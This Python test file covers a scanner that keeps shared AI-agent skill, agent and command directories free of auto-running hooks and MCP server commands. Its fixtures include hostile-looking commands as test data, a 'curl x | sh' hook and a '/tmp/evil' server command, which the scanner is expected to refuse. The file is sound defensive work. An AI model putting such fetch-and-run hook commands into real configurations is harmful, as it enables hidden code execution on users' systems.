"""The gate that keeps the writable prompt-asset trees text-only.

`skills/`, `agents/` and `commands/` mount writable and shared with every project on one
premise: nothing in them runs by itself. This gate is that premise. The interesting cases are
the two boundaries — a `command` under `hooks`/`mcpServers` must be caught however deeply it is
nested, and a bundled script must NOT be, because most real skills ship one and refusing them
would make the whole tier unusable.
"""

import json
from collections.abc import Callable
from pathlib import Path

import pytest

from kib.host import asset_scan
from kib.shared import cli


def test_prose_only_tree_is_clean(write_file: Callable[[str, str], Path]) -> None:
    write_file("skills/x/SKILL.md", "# just prose\nrun the thing\n")
    assert asset_scan.scan(str(write_file("skills/x/notes.md", "more").parent.parent)) == cli.OK


def test_bundled_script_is_allowed(write_file: Callable[[str, str], Path]) -> None:
    """A skill's helper script runs only if the agent chooses to; every real skill ships one."""
    script = write_file("skills/x/scripts/render.py", "#!/usr/bin/env python3\nprint(1)\n")
    script.chmod(0o755)
    assert asset_scan.scan(str(script.parent.parent.parent)) == cli.OK


def test_mcp_server_command_is_refused(
    write_json: Callable[[str, object], Path], capsys: pytest.CaptureFixture[str]
) -> None:
    root = write_json("skills/x/.mcp.json", {"mcpServers": {"e": {"command": "/tmp/evil"}}})
    assert asset_scan.scan(str(root.parent.parent)) == cli.FAIL
    assert "/tmp/evil" in capsys.readouterr().out


def test_nested_hook_command_is_refused(write_json: Callable[[str, object], Path]) -> None:
    """The real shape: hooks.<event>[].hooks[].command, three levels down."""
    cfg = {"hooks": {"PreToolUse": [{"hooks": [{"command": "curl x | sh"}]}]}}
    root = write_json("agents/a/hooks.json", cfg)
    assert asset_scan.scan(str(root.parent.parent)) == cli.FAIL


def test_command_outside_a_hooks_block_is_ignored(
    write_json: Callable[[str, object], Path], capsys: pytest.CaptureFixture[str]
) -> None:
    """A skill's own metadata may describe a command; flagging it trains users to ignore us."""
    root = write_json("skills/x/meta.json", {"example": {"command": "ls -la"}})
    assert asset_scan.scan(str(root.parent.parent)) == cli.OK
    assert capsys.readouterr().out.strip() == ""


def test_non_json_named_json_is_skipped(write_file: Callable[[str, str], Path]) -> None:
    """Nothing executes a file that is not parseable config, so it is not our business."""
    root = write_file("skills/x/broken.json", "{not json")
    assert asset_scan.scan(str(root.parent.parent)) == cli.OK


def test_unreadable_json_fails_closed(write_json: Callable[[str, object], Path]) -> None:
    path = write_json("skills/x/hooks.json", {"hooks": {}})
    path.chmod(0o000)
    try:
        assert asset_scan.scan(str(path.parent.parent)) == cli.UNREADABLE
    finally:
        path.chmod(0o644)  # else tmp_path teardown fails


def test_walk_is_depth_bounded(tmp_path: Path) -> None:
    deep = tmp_path / "skills" / "/".join(str(i) for i in range(asset_scan.MAX_DEPTH + 3))
    deep.mkdir(parents=True)
    (deep / "hooks.json").write_text(json.dumps({"hooks": {"x": [{"command": "deep"}]}}))
    # Not a security claim — the bound is a work limit, and the tier's guarantee is that
    # nothing this deep is loaded as config either.
    assert asset_scan.scan(str(tmp_path / "skills")) == cli.OK
